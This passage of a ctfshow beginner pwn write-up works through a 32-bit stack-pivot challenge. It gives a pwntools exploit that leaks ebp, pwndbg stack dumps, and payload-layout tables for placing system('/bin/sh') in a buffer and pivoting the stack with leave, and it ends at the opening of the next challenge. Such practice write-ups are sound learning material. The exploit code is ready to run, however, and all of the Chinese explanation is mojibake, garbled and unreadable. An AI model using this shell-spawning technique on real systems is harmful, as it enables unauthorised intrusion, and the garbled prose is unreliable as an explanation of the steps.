</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;pwn.challenge.ctf.show&#39;,28218)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">leave</span> <span class="o">=</span> <span class="mh">0x08048766</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x24</span> <span class="o">+</span> <span class="s1">&#39;GPNU&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;codename:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;show&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ebp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/284.png"
	width="1840"
	height="840"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/284_hu_678d2019ac30e4eb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/284_hu_e7e24d5915c8e2a9.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="219"
		data-flex-basis="525px"
	
></p>
<p>ç¬¬äºŒæ­¥ï¼Œå³è¾¹pwndbgè¾“å…¥nï¼ˆnextï¼‰å‘½ä»¤è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œè®©aåƒåœ¾å­—ç¬¦ä¸²æ³¨å…¥ç¨‹åºï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/285.png"
	width="1785"
	height="764"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/285_hu_5bc4324444970bb4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/285_hu_6f502236016507f7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="560px"
	
></p>
<p>ç¬¬ä¸‰æ­¥ï¼Œçœ‹æ ˆå¸§ï¼Œè¾“å…¥stack 50ï¼ˆä¹Ÿå¤Ÿäº†ï¼Œä½ è¾“å…¥60ã€70ä¹Ÿè¡Œï¼Œå°ç‚¹ä¹Ÿè¡Œä¸è¿‡çœ‹ä¸åˆ°ebpå°±å°¬äº†&hellip;ï¼‰</p>
<p>å®Œæ•´ç»“æœå¦‚ä¸‹ï¼ˆæœ‰å›¾æœ‰ä»£ç å°±æ€•ä½ çœ‹ä¸æ‡‚ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; stack 50
</span></span><span class="line"><span class="cl">00:0000â”‚ esp  0xffa86830 â€”â–¸ 0xffa86898 â€”â–¸ 0xffa868a8 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">01:0004â”‚      0xffa86834 â—‚â€” 0x30 /* &#39;0&#39; */
</span></span><span class="line"><span class="cl">02:0008â”‚      0xffa86838 â€”â–¸ 0xffa86870 â—‚â€” 0x61616161 (&#39;aaaa&#39;)
</span></span><span class="line"><span class="cl">03:000câ”‚      0xffa8683c â€”â–¸ 0xf7e35e67 (read+39) â—‚â€” cmp    eax, 0xfffff000 /* &#39;=&#39; */
</span></span><span class="line"><span class="cl">04:0010â”‚      0xffa86840 â€”â–¸ 0xffa86898 â€”â–¸ 0xffa868a8 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">05:0014â”‚      0xffa86844 â€”â–¸ 0xf7f65de0 (_dl_runtime_resolve+16) â—‚â€” pop    edx
</span></span><span class="line"><span class="cl">06:0018â”‚      0xffa86848 â€”â–¸ 0xffa86890 â—‚â€” 0x61616161 (&#39;aaaa&#39;)
</span></span><span class="line"><span class="cl">07:001câ”‚      0xffa8684c â€”â–¸ 0xf7e35e40 (read) â—‚â€” push   esi
</span></span><span class="line"><span class="cl">08:0020â”‚      0xffa86850 â€”â–¸ 0xffa86870 â—‚â€” 0x61616161 (&#39;aaaa&#39;)
</span></span><span class="line"><span class="cl">09:0024â”‚      0xffa86854 â€”â–¸ 0x804b000 (_GLOBAL_OFFSET_TABLE_) â€”â–¸ 0x804af0c (_DYNAMIC) â—‚â€” 0x1
</span></span><span class="line"><span class="cl">0a:0028â”‚      0xffa86858 â€”â–¸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1d7d8c
</span></span><span class="line"><span class="cl">0b:002câ”‚      0xffa8685c â€”â–¸ 0x804870e (ctfshow+53) â—‚â€” add    esp, 0x10
</span></span><span class="line"><span class="cl">0c:0030â”‚      0xffa86860 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">0d:0034â”‚      0xffa86864 â€”â–¸ 0xffa86870 â—‚â€” 0x61616161 (&#39;aaaa&#39;)
</span></span><span class="line"><span class="cl">0e:0038â”‚      0xffa86868 â—‚â€” 0x30 /* &#39;0&#39; */
</span></span><span class="line"><span class="cl">0f:003câ”‚      0xffa8686c â€”â–¸ 0x80486e5 (ctfshow+12) â—‚â€” add    ebx, 0x291b
</span></span><span class="line"><span class="cl">10:0040â”‚ ecx  0xffa86870 â—‚â€” 0x61616161 (&#39;aaaa&#39;)
</span></span><span class="line"><span class="cl">... â†“
</span></span><span class="line"><span class="cl">19:0064â”‚      0xffa86894 â—‚â€” 0x554e5047 (&#39;GPNU&#39;)
</span></span><span class="line"><span class="cl">1a:0068â”‚ ebp  0xffa86898 â€”â–¸ 0xffa868a8 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">1b:006câ”‚      0xffa8689c â€”â–¸ 0x80487b5 (main+77) â—‚â€” mov    eax, 0
</span></span><span class="line"><span class="cl">1c:0070â”‚      0xffa868a0 â€”â–¸ 0xffa868c0 â—‚â€” 0x1
</span></span><span class="line"><span class="cl">1d:0074â”‚      0xffa868a4 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">... â†“
</span></span><span class="line"><span class="cl">1f:007câ”‚      0xffa868ac â€”â–¸ 0xf7d67fa1 (__libc_start_main+241) â—‚â€” add    esp, 0x10
</span></span><span class="line"><span class="cl">20:0080â”‚      0xffa868b0 â€”â–¸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1d7d8c
</span></span><span class="line"><span class="cl">... â†“
</span></span><span class="line"><span class="cl">22:0088â”‚      0xffa868b8 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">23:008câ”‚      0xffa868bc â€”â–¸ 0xf7d67fa1 (__libc_start_main+241) â—‚â€” add    esp, 0x10
</span></span><span class="line"><span class="cl">24:0090â”‚      0xffa868c0 â—‚â€” 0x1
</span></span><span class="line"><span class="cl">25:0094â”‚      0xffa868c4 â€”â–¸ 0xffa86954 â€”â–¸ 0xffa8721f â—‚â€” &#39;./pwn&#39;
</span></span><span class="line"><span class="cl">26:0098â”‚      0xffa868c8 â€”â–¸ 0xffa8695c â€”â–¸ 0xffa87225 â—‚â€” &#39;LC_NUMERIC=zh_CN.UTF-8&#39;
</span></span><span class="line"><span class="cl">27:009câ”‚      0xffa868cc â€”â–¸ 0xffa868e4 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">28:00a0â”‚      0xffa868d0 â—‚â€” 0x1
</span></span><span class="line"><span class="cl">29:00a4â”‚      0xffa868d4 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">2a:00a8â”‚      0xffa868d8 â€”â–¸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1d7d8c
</span></span><span class="line"><span class="cl">2b:00acâ”‚      0xffa868dc â€”â–¸ 0xf7f6071a (call_init.part+26) â—‚â€” add    edi, 0x178e6
</span></span><span class="line"><span class="cl">2c:00b0â”‚      0xffa868e0 â€”â–¸ 0xf7f78000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x26f34
</span></span><span class="line"><span class="cl">2d:00b4â”‚      0xffa868e4 â—‚â€” 0x0
</span></span><span class="line"><span class="cl">2e:00b8â”‚      0xffa868e8 â€”â–¸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1d7d8c
</span></span><span class="line"><span class="cl">2f:00bcâ”‚      0xffa868ec â—‚â€” 0x0
</span></span><span class="line"><span class="cl">... â†“
</span></span><span class="line"><span class="cl">31:00c4â”‚      0xffa868f4 â—‚â€” 0xfa28923b
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/286.png"
	width="1329"
	height="780"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/286_hu_8d1491c2bb76aa5c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/286_hu_91016114408ff1d7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="408px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°â€œGPNUâ€ã€â€œaaaaâ€å­—ç¬¦ä¸²éƒ½è¢«æ³¨å…¥åˆ°ç¨‹åºé‡Œå•¦ï¼Œèƒ½çœ‹åˆ°espå’Œebpè·ç¦»ï¼Œç®—ä¸€ç®—å°±æ˜¯<code>0x38</code>ï¼ˆ0xffa868a8-0xffa86870ï¼‰ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/287.png"
	width="1040"
	height="275"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/287_hu_f37bb99af07d6d74.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/287_hu_e620d902fd68d8ec.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="378"
		data-flex-basis="907px"
	
></p>
<p>è¿™é‡Œçš„ <code>0x38</code> æ˜¯ <code>ebp</code> åˆ° â€œç›®æ ‡å¯æ§ç¼“å†²åŒºâ€ çš„å›ºå®šåç§»ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ebp-0x38æ¥è¡¨ç¤ºbufçš„åœ°å€ã€‚</p>
<p>åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥å®Œåï¼Œè¿›å…¥åˆ°ç¬¬äºŒæ¬¡è¾“å…¥ï¼Œæˆ‘ä»¬è¦å¾€bufä¸­å†™å…¥system(&quot;/bin/sh&quot;),åŒæ—¶è¿˜è¦å°†æ ˆåŠ«æŒè¿”å›bufåœ°å€ï¼Œç„¶åå°±æ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦çš„<code>system(&quot;/bin/sh&quot;);</code></p>
<p>æ„é€ payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># æ„é€ payloadï¼šå¸ƒç½®systemè°ƒç”¨ + æ ˆè¿ç§»æŒ‡ä»¤</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¨‹åºæœ‰ç»™systemå‡½æ•°ï¼Œç›´æ¥è°ƒç”¨ã€‚</p>
<p>æˆ‘ä»¬åœ¨æ„é€  Payload æ—¶ï¼Œä¼šå°† <code>system</code> è°ƒç”¨ç›¸å…³çš„ä»£ç æå‰å¸ƒç½®åˆ° <code>buf</code> ä¸­ï¼Œè€Œ <code>buf</code> ä½œä¸ºæ ˆè¿ç§»çš„ç›®æ ‡ç¼“å†²åŒºï¼Œå…¶å†…éƒ¨å­—èŠ‚å¸ƒå±€æ˜¯å›ºå®šçš„ï¼ˆ32 ä½ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæŒ‡é’ˆ / åœ°å€å  4 å­—èŠ‚ï¼‰</p>
<p>Payload æ•´ä½“åˆ†ä¸º <strong>â€œæ”»å‡»ä»£ç æ®µâ€</strong> å’Œ <strong>â€œæ ˆè¿ç§»æ§åˆ¶æ®µâ€</strong> ä¸¤éƒ¨åˆ†:</p>
<p>1ã€æ”»å‡»ä»£ç æ®µï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;aaaa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>å†…å­˜åœ°å€èŒƒå›´</th>
          <th>å­˜å‚¨å†…å®¹</th>
          <th>å ç”¨å­—èŠ‚</th>
          <th>ä½œç”¨è¯´æ˜</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>buf 0 ~ buf + 3</code></td>
          <td><code>system</code> å‡½æ•°åœ°å€</td>
          <td>4</td>
          <td>è§¦å‘ <code>system</code> è°ƒç”¨çš„å…¥å£</td>
      </tr>
      <tr>
          <td><code>buf 0 + 4 ~ buf + 7</code></td>
          <td>åƒåœ¾æ•°æ®p32(&lsquo;aaaa&rsquo;) || p32(0)</td>
          <td>4</td>
          <td>å ä½ <code>system</code> è°ƒç”¨åçš„ â€œè¿”å›åœ°å€â€</td>
      </tr>
      <tr>
          <td><code>buf 0 + 8 ~ buf + 11</code></td>
          <td><code>buf 0 + 12</code>ï¼ˆå‚æ•°åœ°å€ï¼‰</td>
          <td>4</td>
          <td>æŒ‡å‘ <code>/bin/sh\x00</code> çš„åœ°å€ï¼Œå³ <code>system</code> çš„å‚æ•°</td>
      </tr>
      <tr>
          <td><code>buf 0 + 12 ~ åç»­</code></td>
          <td><code>/bin/sh\x00</code> å­—ç¬¦ä¸²</td>
          <td>8</td>
          <td><code>system</code> è°ƒç”¨çš„æ ¸å¿ƒå‚æ•°ï¼ˆéœ€ä»¥ <code>\x00</code> ç»“å°¾ç¡®ä¿å­—ç¬¦ä¸²ç»ˆæ­¢ï¼‰</td>
      </tr>
  </tbody>
</table></div>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆæ˜¯ buf + 12ï¼Ÿ</strong></p>
<p>ä»ä¸Šè¿°å¸ƒå±€å¯çŸ¥ï¼Œ<code>/bin/sh\x00</code> å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€æ°å¥½æ˜¯ <code>buf + 12</code>ï¼ŒåŸå› æ˜¯ï¼š</p>
<ul>
<li>å‰ 3 ä¸ª â€œ4 å­—èŠ‚å—â€ï¼ˆ<code>system</code> åœ°å€ã€åƒåœ¾æ•°æ®ã€å‚æ•°åœ°å€ï¼‰å…±å ç”¨ <code>3 Ã— 4 = 12</code> å­—èŠ‚ï¼›</li>
<li>å› æ­¤ï¼Œ<code>/bin/sh\x00</code> ä¼šä» <code>buf</code> èµ·å§‹åœ°å€å‘ååç§» 12 å­—èŠ‚çš„ä½ç½®å¼€å§‹å­˜å‚¨ï¼Œå³ <code>buf + 12</code>ã€‚</li>
</ul>
</blockquote>
<p>2ã€æ ˆè¿ç§»æ§åˆ¶æ®µï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p32</span><span class="p">(</span><span class="n">buf</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å„å­—æ®µåŠŸèƒ½å¦‚ä¸‹ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th style="text-align: left">å­—æ®µ</th>
          <th>å†…å®¹ / ä½œç”¨</th>
          <th>å…³è”æ–‡æ¡£ä¾æ®</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><code>p32(buf - 4)</code></td>
          <td>è¦†ç›–æ ˆä¸Šçš„ <code>ebp</code> å¯„å­˜å™¨ä¸º <code>buf - 4</code>ï¼šè¿™æ˜¯ â€œå‡ <code>ebp</code>â€ï¼Œä¸ºåç»­ <code>leave</code> æŒ‡ä»¤ç¬¬ä¸€æ­¥ï¼ˆ<code>mov esp, ebp</code>ï¼‰åšå‡†å¤‡</td>
          <td><code>buf - 4</code> æ˜¯ä¸º <code>pop ebp</code> ç•™ä½</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>p32(leave)</code></td>
          <td>è¦†ç›–æ ˆä¸Šçš„ â€œè¿”å›åœ°å€â€ ä¸º <code>leave</code> æŒ‡ä»¤åœ°å€ï¼ˆ<code>leave = 0x08048766</code>ï¼‰ï¼šè®©ç¨‹åºæ‰§è¡Œå®Œå½“å‰å‡½æ•°åï¼Œä¼˜å…ˆæ‰§è¡Œ <code>leave</code> æŒ‡ä»¤è§¦å‘æ ˆè¿ç§»</td>
          <td><code>leave</code> æŒ‡ä»¤ = <code>mov esp, ebp; pop ebp</code></td>
      </tr>
  </tbody>
</table></div>
<p>p32(buf-4) æ˜¯å°†ebpè¦†ç›–æˆbufçš„åœ°å€-4 ä¸ºä»€ä¹ˆè¦-4ï¼Ÿè¿™æ˜¯å› ä¸ºæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯ä¸¤ä¸ªleaveï¼Œä½†æ˜¯ç¬¬äºŒä¸ªleaveçš„pop ebpï¼Œåœ¨å‡ºæ ˆçš„æ—¶å€™ä¼šesp+4ã€‚å°±ä¼šæŒ‡å‘esp+4çš„ä½ç½®ï¼Œp32(leave) ,å°†è¿”å›åœ°å€è¦†ç›–æˆleaveï¼Œåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬æˆåŠŸå°†æ ˆåŠ«æŒåˆ°äº†æˆ‘ä»¬çš„bufå¤„ï¼Œæ¥ä¸‹æ¥å°±ä¼šæ‰§è¡Œæ ˆé‡Œçš„å†…å®¹ã€‚ç´¯æ­»äº†ï¼ï¼ï¼</p>
<p>å®Œæ•´expï¼ˆpython2ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(io)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28229</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">leave</span> <span class="o">=</span> <span class="mh">0x08048766</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x24</span> <span class="o">+</span> <span class="s1">&#39;GPNU&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;codename:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;GPNU&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ebp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1">#pause()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ebp=&#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ebp</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x38</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;aaaa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#pause()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ€»ç»“ï¼šè¿™ä¸ªæ ˆè¿ç§»æ‰‹æ³•è¿˜æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œä¸ºæ•°ä¸å¤šæ ˆè€ƒç‚¹çš„éš¾ç‚¹ä¹‹ä¸€ï¼Œé‡åœ¨ä½¿ç”¨gdbè°ƒè¯•å‡ºå›ºå®šåç§»å’Œpayloadæ„é€ ï¼Œå¯¹æ ˆå¸§ç»“æ„è¦åŠ æ·±ç†è§£ã€‚</p>
<h3 id="pwn_076">PWN_076
</h3><p>é¢˜ç›®ï¼šè¿˜æ˜¯é‚£å¥è¯ï¼Œç†æ¸…é€»è¾‘å¾ˆé‡è¦ï¼›</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/289.png"
	width="815"
	height="271"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/289_hu_139e47b006d19a8f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/289_hu_871500d2d1f83750.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="300"
		data-flex-basis="721px"
	
></p>
<p>32ä½å…³é—­PIEéƒ¨åˆ†å¼€å¯RELROï¼Œæ ˆä¿æŠ¤ä¸NXæ˜¯å¼€å¯çš„ï¼Œè¿™é‡Œåœ¨IDAæŸ¥çœ‹åå‘ç°åƒæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œç”¨æŒ‡ä»¤ç¡®è®¤çœ‹ä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/290.png"
	width="1645"
	height="95"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/290_hu_f03ab5b550eef4ff.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/290_hu_51897e296cb322c0.png 1024w"
	loading="lazy"
	
		alt="é™æ€ç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="1731"
		data-flex-basis="4155px"
	
></p>
<p>IDAåˆ†æå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/393.png"
